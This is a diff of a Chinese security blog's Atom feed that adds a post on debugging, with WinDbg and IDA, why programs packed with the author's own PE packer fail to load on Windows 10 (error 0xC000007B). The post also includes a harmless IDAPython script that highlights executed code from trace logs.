@@ -1,5 +1,216 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://citrusice.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://citrusice.github.io/" rel="alternate" type="text/html" /><updated>2021-09-02T14:22:14+08:00</updated><id>https://citrusice.github.io/feed.xml</id><title type="html">Nqd8VId6</title><subtitle>my blog
-</subtitle><entry><title type="html">将书签导入Zotero</title><link href="https://citrusice.github.io/posts/importing-bookmarks-to-zotero/" rel="alternate" type="text/html" title="将书签导入Zotero" /><published>2021-09-02T14:17:40+08:00</published><updated>2021-09-02T14:17:40+08:00</updated><id>https://citrusice.github.io/posts/importing-bookmarks-to-zotero</id><content type="html" xml:base="https://citrusice.github.io/posts/importing-bookmarks-to-zotero/">&lt;p&gt;接触安全已有两年，这期间看了大量的文章，其中大部分都使用浏览器的收藏夹来保存，还有一小部分用印象笔记的网页剪藏。以书签的方式保存文章并不可靠，经常会遇到文章被删或者由于一些博主换了博客主题而导致之前的url不可用。印象笔记的剪藏固然很好，然而我并不敢投入太多在印象笔记之中（并不是很满意印象笔记，一直在搜寻可替代的软件，投入太多会导致迁移成本的增加），直到朋友向我推荐了Zotero。&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://citrusice.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://citrusice.github.io/" rel="alternate" type="text/html" /><updated>2021-09-07T15:15:29+08:00</updated><id>https://citrusice.github.io/feed.xml</id><title type="html">Nqd8VId6</title><subtitle>my blog
+</subtitle><entry><title type="html">调试PE装载过程——0xC000007B</title><link href="https://citrusice.github.io/posts/debugging-error-code-0xc000007b/" rel="alternate" type="text/html" title="调试PE装载过程——0xC000007B" /><published>2021-09-07T15:02:28+08:00</published><updated>2021-09-07T15:02:28+08:00</updated><id>https://citrusice.github.io/posts/debugging-error-code-0xc000007b</id><content type="html" xml:base="https://citrusice.github.io/posts/debugging-error-code-0xc000007b/">&lt;p&gt;自己写了个壳，对win10上一些程序加壳后发现程序无法运行，错误提示为0xC000007B，改来改去也找不到原因，于是准备调式一下，本文记录部分调试的过程以及思路。&lt;/p&gt;
+
+&lt;p&gt;0xC000007B很明显是一个NTSTATUS值，其对应的宏为STATUS_INVALID_IMAGE_FORMAT，这表明加壳后的PE文件对于操作系统来说是一个非法的PE文件，那么首先想到的就是在创建进程的过程中由于PE格式错误而导致进程创建失败。由于之前存在知识的误区，以为ntdll以及pe文件的装载是在内核中进行的，导致我调了半天NtCreateUserProcess。后来当我发现NtCreateUserProcess最终成功创建了进程之后我才醒悟，镜像的装载应该是在三环中由ntdll进行的。&lt;/p&gt;
+
+&lt;p&gt;尽管镜像的装载是在三环进行，但这并不代表可以使用三环调试器去调试镜像的装载过程，三环调试的入口在镜像装载之后，这使得无法在三环调试镜像装载的过程，还是需要靠内核调试。&lt;/p&gt;
+
+&lt;p&gt;首先用脚本断在进程创建成功之后，并切换到目标进程空间。由于此时peb的ldr项没有被初始化所以无法自动加载符号，需要手动指定ntdll的机制来装载符号。用内存搜索的方式搜索MZ头或者切换到其他进程空间查看ntdll的基址。在找到基址之后使用&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1: kd&amp;gt; .reload ntdll.dll=00007ffe`27f10000,001F5000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;手动装载符号。&lt;/p&gt;
+
+&lt;p&gt;开始定位问题，当程序装在失败后，由于进程已经创建，肯定需要调用ntdll!NtTerminateProcess终止进程，因此在这里下断，然后继续执行，当出现错误窗口后点击确定，程序会断在ntdll!NtTerminateProcess，此时查看调用堆栈&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; bp /1 ntdll!NtTerminateProcess
+0: kd&amp;gt; g
+Breakpoint 2 hit
+ntdll!NtTerminateProcess:
+0033:00007ffe`27fac310 4c8bd1          mov     r10,rcx
+1: kd&amp;gt; k
+ # Child-SP          RetAddr               Call Site
+00 00000012`f84ef568 00007ffe`27fd2375     ntdll!NtTerminateProcess
+01 00000012`f84ef570 00007ffe`27f847c3     ntdll!_LdrpInitialize+0x4db99
+02 00000012`f84ef610 00007ffe`27f8476e     ntdll!LdrpInitialize+0x3b
+03 00000012`f84ef640 00000000`00000000     ntdll!LdrInitializeThunk+0xe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;看到程序在_LdrpInitialize调用了退出函数。&lt;/p&gt;
+
+&lt;p&gt;通过ida看到有许多分支都可以导致_LdrpInitialize失败，为了确定失败的具体地方，在_LdrpInitialize下断，用pa命令trace程序的执行流程。&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1: kd&amp;gt; bp /p @$proc /1 ntdll!_LdrpInitialize
+1: kd&amp;gt; g
+Breakpoint 1 hit
+ntdll!_LdrpInitialize:
+0033:00007ffe`27f847dc 4889542410      mov     qword ptr [rsp+10h],rdx
+1: kd&amp;gt; pa ntdll!_LdrpInitialize+0x4db89
+ntdll!_LdrpInitialize+0x5:
+0033:00007ffe`27f847e1 53              push    rbx
+
+......
+
+ntdll!_LdrpInitialize+0x4d93a:
+0033:00007ffe`27fd2116 e845fa0000      call    ntdll!LdrpInitializeProcess (00007ffe`27fe1b60)
+ntdll!_LdrpInitialize+0x4d93f:
+0033:00007ffe`27fd211b 8bf8            mov     edi,eax
+ntdll!_LdrpInitialize+0x4d941:
+0033:00007ffe`27fd211d 898424b0000000  mov     dword ptr [rsp+0B0h],eax
+ntdll!_LdrpInitialize+0x4d948:
+0033:00007ffe`27fd2124 85c0            test    eax,eax
+ntdll!_LdrpInitialize+0x4d94a:
+0033:00007ffe`27fd2126 794b            jns     ntdll!_LdrpInitialize+0x4d997 (00007ffe`27fd2173)
+ntdll!_LdrpInitialize+0x4d94c:
+0033:00007ffe`27fd2128 8b0582390a00    mov     eax,dword ptr [ntdll!LdrpDebugFlags (00007ffe`28075ab0)]
+ntdll!_LdrpInitialize+0x4d952:
+0033:00007ffe`27fd212e a803            test    al,3
+ntdll!_LdrpInitialize+0x4d954:
+0033:00007ffe`27fd2130 7431            je      ntdll!_LdrpInitialize+0x4d987 (00007ffe`27fd2163)
+ntdll!_LdrpInitialize+0x4d987:
+0033:00007ffe`27fd2163 a810            test    al,10h
+ntdll!_LdrpInitialize+0x4d989:
+0033:00007ffe`27fd2165 7401            je      ntdll!_LdrpInitialize+0x4d98c (00007ffe`27fd2168)
+ntdll!_LdrpInitialize+0x4d98c:
+0033:00007ffe`27fd2168 41be00200000    mov     r14d,2000h
+ntdll!_LdrpInitialize+0x4d992:
+0033:00007ffe`27fd216e e9f826fbff      jmp     ntdll!_LdrpInitialize+0x8f (00007ffe`27f8486b)
+ntdll!_LdrpInitialize+0x8f:
+0033:00007ffe`27f8486b 85ff            test    edi,edi
+ntdll!_LdrpInitialize+0x91:
+0033:00007ffe`27f8486d 0f88f0da0400    js      ntdll!_LdrpInitialize+0x4db87 (00007ffe`27fd2363)
+ntdll!_LdrpInitialize+0x4db87:
+0033:00007ffe`27fd2363 8bcf            mov     ecx,edi
+ntdll!_LdrpInitialize+0x4db89:
+0033:00007ffe`27fd2365 e86ee40000      call    ntdll!LdrpInitializationFailure (00007ffe`27fe07d8)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;可以看到在程序调用LdrpInitializeProcess后执行流程走向了失败，在call    ntdll!LdrpInitializeProcess的下一条指令下断，断下后查看函数返回值发现正是所报出的错误代码&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; bp /1 00007ffe`27fd211b
+0: kd&amp;gt; g
+Breakpoint 1 hit
+ntdll!_LdrpInitialize+0x4d93f:
+0033:00007ffe`27fd211b 8bf8            mov     edi,eax
+0: kd&amp;gt; r rax
+rax=00000000c000007b
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;层层深入LdrpInitializeProcess，最终定位到问题位于LdrpProcessMappedModule&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210812171334927.png&quot; alt=&quot;image-20210812171334927&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;问题来源于gs机制，由于LdrInitSecurityCookie调用失败返回0导致返回0xC000007B&lt;/p&gt;
+
+&lt;p&gt;继续深入：&lt;/p&gt;
+
+&lt;p&gt;LdrpFetchAddressOfSecurityCookie 失败 返回0&lt;/p&gt;
+
+&lt;p&gt;LdrImageDirectoryEntryToLoadConfig失败 返回0&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210813102630235.png&quot; alt=&quot;image-20210813102630235&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;分析代码发现LdrImageDirectoryEntryToLoadConfig会去寻找pe中的load config数据目录项，而程序经过加壳后把这块去掉了，因此无法找到&lt;/p&gt;
+
+&lt;p&gt;加上了原有的loadconfig数据目录项后又出现了另一个错误，报错同样是0xC000007B，问题出在LdrpFetchAddressOfSecurityCookie中&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ntdll!LdrpFetchAddressOfSecurityCookie+0x4a:
+0033:00007ffe`27f431fa 488b7858        mov     rdi,qword ptr [rax+58h] ds:002b:00007ff7`fe5e1498=0000000140032ce0
+rax=00007ff7fe5e1440 rbx=00000030ab39eeb8 rcx=00007ff7fe580100
+rdx=0000000000008664 rsi=00007ff7fe580000 rdi=0000000140032ce0
+rip=00007ffe27f431fe rsp=00000030ab39ee40 rbp=0000000000084000
+ r8=00007ff7fe5e1440  r9=00000030ab39ee00 r10=00007ff7fe580100
+r11=00007ff7fe5e1440 r12=0000000000000000 r13=0000000000000003
+r14=00000030ab39eeb0 r15=0000000000000000
+iopl=0         nv up ei pl nz na pe nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;在获取了load config数据目录项的地址后，会将地址存在rax中，随后会去找rax+58h(88)中存的值放入rdi。这里rax指向的便是load config table，而0x58的偏移则为SecurityCookie&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;60/88 | 4/8  | SecurityCookie | A pointer to a cookie that is used by Visual C++ or GS implementation.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;这个值是一个存放在表中的pointer，可以看到rdi中的地址是未经重定位的，因此导致了指针指向的位置不正确。&lt;/p&gt;
+
+&lt;p&gt;解决方案有两个，分析LdrpProcessMappedModule函数的逻辑可以发现即使LdrInitSecurityCookie调用失败也有另一种情况可以使代码走向成功的分支，即OSVersion&amp;lt;7，因此最简单的解决方案为修改PE头的字段则可以解决；另一种方案则是为PE加入load configuration directory，并为其在重定位表中加入指向SecurityCookie的重定位项。&lt;/p&gt;
+
+&lt;p&gt;参考资料：&lt;/p&gt;
+
+&lt;p&gt;https://github.com/upx/upx/issues/154&lt;/p&gt;
+
+&lt;p&gt;https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#the-load-configuration-structure-image-only&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;在调试过程中修改了一个小脚本用于在IDA里直观的查看执行流程&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# https://unit42.paloaltonetworks.com/using-idapython-to-make-your-life-easier-part-4/
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;idaapi&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idaapi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_inf_structure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_64bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DEFAULT_REGEX&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;([0-9A-Fa-f]{8})`([0-9A-Fa-f]{8})&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DEFAULT_REGEX&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;([0-9A-Fa-f]{4})`([0-9A-Fa-f]{4})&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;COLOR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xF2D475&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF2BD52&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xBC7D2D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6D4100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;addrList&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_new_color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# colors = [0xFFE699, 0xFFCC33, 0xE6AC00, 0xB38600]
+&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_color&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFFFFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;COLOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_color&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;COLOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;COLOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;COLOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;COLOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;COLOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFFFFF&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;unhighlight&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addrList&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addrList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;idaapi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_item_color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;addrList&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;highlight&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# read trace address file
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;addrsFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addrsFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DEFAULT_REGEX&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;# print(line)
+&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;c1&quot;&gt;# print(r.groups())
+&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;c1&quot;&gt;# try:
+&lt;/span&gt;
+            &lt;span class=&quot;c1&quot;&gt;#     hexAddr = long(addr.replace(&quot;`&quot;, &quot;&quot;)[0:16], 16)
+&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;#     print(hexAddr)
+&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;# except:
+&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;#     continue
+&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;addrColor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idaapi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_item_color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;newColor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_new_color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addrColor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;idaapi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_item_color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newColor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;addrList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;success!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;Trace HighLighter Usage:
+highlight(file_path,pattern=None)
+unhight()
+&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;首先在windbg中.logopen打开log，然后执行pa等trace命令，最后.logclose，在IDA控制台调用函数highlight(file_path,pattern=None)即可根据trace的log对执行的代码进行标记。&lt;/p&gt;
+
+&lt;p&gt;效果：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210907150755293.png&quot; alt=&quot;image-20210907150755293&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="reverse-engineering" /><category term="debugging" /><category term="PEPacker" /><summary type="html">自己写了个壳，对win10上一些程序加壳后发现程序无法运行，错误提示为0xC000007B，改来改去也找不到原因，于是准备调式一下，本文记录部分调试的过程以及思路。</summary></entry><entry><title type="html">将书签导入Zotero</title><link href="https://citrusice.github.io/posts/importing-bookmarks-to-zotero/" rel="alternate" type="text/html" title="将书签导入Zotero" /><published>2021-09-02T14:17:40+08:00</published><updated>2021-09-02T14:17:40+08:00</updated><id>https://citrusice.github.io/posts/importing-bookmarks-to-zotero</id><content type="html" 